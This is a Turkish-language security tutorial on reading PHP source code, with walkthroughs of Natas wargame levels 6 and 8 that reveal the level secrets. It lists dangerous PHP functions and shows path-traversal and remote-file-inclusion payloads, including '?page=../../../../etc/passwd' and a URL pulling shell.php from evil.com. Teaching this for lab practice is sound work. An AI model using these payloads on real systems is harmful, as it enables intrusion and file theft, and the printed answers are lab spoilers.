# 🌐 Web Güvenliği — PHP Kaynak Kodu Okuma

> Sunucu PHP kodunu çalıştırır ve sana sonucu gösterir.
> Ama bazen kaynak kodun kendisi de görünür — ve içinde sırlar vardır.

---

## 📋 İçindekiler

- [PHP Nedir?](#php-nedir)
- [Kaynak Kodu Nerede Görünür?](#kaynak-kodu-nerede-görünür)
- [Kritik PHP Fonksiyonları](#kritik-php-fonksiyonları)
- [include ve require](#include-ve-require)
- [Encoding Fonksiyonları](#encoding-fonksiyonları)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## PHP Nedir?

**PHP**, sunucu tarafında çalışan bir programlama dilidir. Kullanıcı sayfayı istediğinde sunucu PHP kodunu çalıştırır, çıktı olarak HTML üretir ve bunu tarayıcıya gönderir. Tarayıcı normalde PHP kodunu görmez — sadece sonucu görür.

```
Dosya: index.php          Tarayıcı gördüğü:
┌─────────────────┐       ┌─────────────────┐
│ <?php           │       │ <html>          │
│   $x = 2 + 2;  │  →→→  │   Sonuç: 4     │
│   echo $x;     │       │ </html>         │
│ ?>              │       └─────────────────┘
└─────────────────┘
```

---

## Kaynak Kodu Nerede Görünür?

### 1. Sayfa "View Source" Linkini Kendisi Veriyor

Natas'ta çoğu level sayfanın altında şöyle bir link koyar:

```html
<a href="index-source.html">View sourcecode</a>
```

Bu link tıklanınca PHP kodu highlight edilmiş şekilde gösterilir.

### 2. include Edilen Dosyayı Doğrudan Açmak

```php
include "includes/secret.inc";
```

PHP dosyaları (`.php`) sunucu tarafında çalıştırılır. Ama `.inc` uzantılı dosyalar bazı sunucularda düz metin olarak servis edilir:

```bash
# Bu URL'yi doğrudan aç
curl http://natas6.natas.labs.overthewire.org/includes/secret.inc
# <?php $secret = "XXXXXXXXXXX"; ?>
```

### 3. Yedek Dosyalar

Sunucuda `.php.bak`, `.php.old`, `.php~` gibi dosyalar varsa bunlar çalıştırılmaz, düz metin olarak döner:

```bash
curl http://example.com/index.php.bak    # kaynak kodu düz döner
curl http://example.com/index.php~       # editör yedeği
```

---

## Kritik PHP Fonksiyonları

Kaynak kodda şu fonksiyonları gördüğünde dikkatle analiz et:

### Kod Çalıştırma

| Fonksiyon | Ne Yapar | Tehlike |
|-----------|----------|---------|
| `system($cmd)` | Shell komutu çalıştırır, çıktısını ekrana basar | Command Injection |
| `passthru($cmd)` | Shell komutu çalıştırır, ham çıktı döner | Command Injection |
| `exec($cmd)` | Shell komutu çalıştırır, son satırı döner | Command Injection |
| `shell_exec($cmd)` | Shell komutu çalıştırır, tüm çıktıyı döner | Command Injection |
| `eval($code)` | PHP kodu olarak çalıştırır | Code Injection |
| `preg_replace('/pat/e', $repl, $str)` | Eski PHP'de kod çalıştırabilir | Code Injection |

### Dosya Okuma

| Fonksiyon | Ne Yapar | Tehlike |
|-----------|----------|---------|
| `include($file)` | Dosyayı PHP olarak dahil eder | LFI |
| `require($file)` | include gibi, hata durumunda durur | LFI |
| `file_get_contents($file)` | Dosyayı string olarak okur | LFI |
| `fopen($file, 'r')` | Dosyayı açar | LFI |
| `readfile($file)` | Dosyayı okuyup çıktılar | LFI |

### Karşılaştırma

| Fonksiyon/Operatör | Tehlike |
|--------------------|---------|
| `==` (loose comparison) | Type juggling — Katman 4'te |
| `strcmp($a, $b)` | Array ile kullanımda bypass — Katman 4'te |
| `md5($str)` | Magic hash zafiyeti — Katman 4'te |

---

## include ve require

`include` ve `require`, başka bir dosyanın içeriğini sanki o satıra yazılmış gibi dahil eder.

```php
<?php
include "config.php";      // config.php'deki değişkenler burada kullanılabilir
include "includes/secret.inc";  // gizli değişkeni dahil et
?>
```

### Güvenlik Açısından Tehlikeli Kullanım

```php
// KÖTÜ: Kullanıcı girdisi doğrudan include'a veriliyor
$page = $_GET['page'];
include($page);

// Saldırgan şunu yapar:
// ?page=../../../../etc/passwd
// ?page=http://evil.com/shell.php   (RFI — Remote File Inclusion)
```

### include Edilen Dosyaları Bulmak

Kaynak kodda `include` veya `require` gördüğünde:

```php
include "includes/secret.inc";
//              ↑
//   Bu dosyayı doğrudan URL'den aç
```

```bash
curl -u natas6:[şifre] \
     http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

---

## Encoding Fonksiyonları

PHP kaynak kodunda şifrelenmiş/encode edilmiş bir değer görüyorsan, tersini uygulamak gerekir.

### base64_encode / base64_decode

```php
$encoded = base64_encode("gizli_veri");   // "Z2l6bGlfdmVyaQ=="
$decoded = base64_decode($encoded);        // "gizli_veri"
```

Kaynak kodda `base64_encode($secret)` görüyorsan, cookie veya parametre olarak gelen Base64 değerini decode etmek gerekir.

### strrev — String Ters Çevirme

```php
$gizli = strrev("tersi_alinacak");
// "kalacakinis_isret" → tersi: "tersi_alinacak"
```

### hex2bin / bin2hex

```php
$hex    = bin2hex("natas");       // "6e61746173"
$string = hex2bin("6e61746173");  // "natas"
```

### Zincirleme (Natas 8 Tarzı)

```php
// Şifreleme (gerçek Natas 8 sırası — base64 EN İÇTE, hex EN DIŞTA):
$encodedSecret = bin2hex(strrev(base64_encode($secret)));

// Tersini almak için (ters sıra):
// 1. hex2bin
// 2. strrev
// 3. base64_decode
```

```bash
# Terminal'de tersini al
echo "3d3d516343746d4d6d6c315669563362" | python3 -c "
import sys, base64
encoded = sys.stdin.read().strip()
step1 = bytes.fromhex(encoded)            # hex2bin
step2 = step1[::-1]                       # strrev
step3 = base64.b64decode(step2)           # base64_decode
print(step3.decode())                     # → oubWYf2kBq
"
```

Veya CyberChef ile: `From Hex` → `Reverse` → `From Base64`

---

## Natas'ta Kullanım

### Natas 6 — include ile Gizlenmiş Secret

**Kaynak kod:**

```php
<?php
include "includes/secret.inc";

if(array_key_exists("submit", $_POST)) {
    if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
}
?>
```

**Analiz:**
- `$secret` değişkeni `includes/secret.inc` dosyasından geliyor
- O dosyayı doğrudan aç

```bash
curl -u natas6:[şifre] \
     http://natas6.natas.labs.overthewire.org/includes/secret.inc
# <?php $secret = "FOEIUWGHFEEUHOFUOIU"; ?>
```

Secret'i bulduk. Formu bu değerle doldur → şifreyi al.

---

### Natas 8 — Zincirleme Encoding

**Kaynak kod:**

```php
<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
        print "Access granted...";
    } else {
        print "Wrong secret";
    }
}
?>
```

**Analiz:**

`encodeSecret()` şu adımları uygulayarak encode ediyor:
1. `base64_encode($secret)`
2. `strrev(...)` — string tersine çevir
3. `bin2hex(...)` — hex'e çevir

Tersini almak için bu adımları ters sırayla uygula:
1. `hex2bin("3d3d516343746d4d6d6c315669563362")`
2. `strrev(...)` — string tersine çevir
3. `base64_decode(...)` — Base64 decode

```bash
python3 -c "
import base64
step1 = bytes.fromhex('3d3d516343746d4d6d6c315669563362')
step2 = step1[::-1]
step3 = base64.b64decode(step2)
print(step3.decode())
"
# oubWYf2kBq
```

Formu `oubWYf2kBq` ile doldur → şifreyi al.

---

### PHP Kaynak Kodu Okuma — Kontrol Listesi

```
Kaynak kodu gördüğünde:
  ☐ include/require ile dahil edilen dosyaları bul → URL'den aç
  ☐ system/passthru/exec olan yerleri not et → Command Injection olabilir
  ☐ include($_GET['...']) gibi dinamik include'ları bul → LFI olabilir
  ☐ Encoding fonksiyonlarını tespit et (base64, strrev, hex) → tersini al
  ☐ Karşılaştırmaları not et (== vs ===, strcmp) → Type juggling olabilir
  ☐ $_GET, $_POST, $_COOKIE ile gelen değerlerin nerede kullanıldığına bak
```

---

## 🔗 Kaynaklar

- [PHP Manual — include](https://www.php.net/manual/en/function.include.php)
- [PHP Manual — base64_encode](https://www.php.net/manual/en/function.base64-encode.php)
- [PortSwigger — Server-side Vulnerabilities](https://portswigger.net/web-security/server-side)
- [CyberChef](https://gchq.github.io/CyberChef/) — encoding/decoding için

---

**Önceki konu:** [04_cookie_manipulasyonu.md](./04_cookie_manipulasyonu.md)
**Sonraki konu:** [06_encoding_ve_obfuscation.md](./06_encoding_ve_obfuscation.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
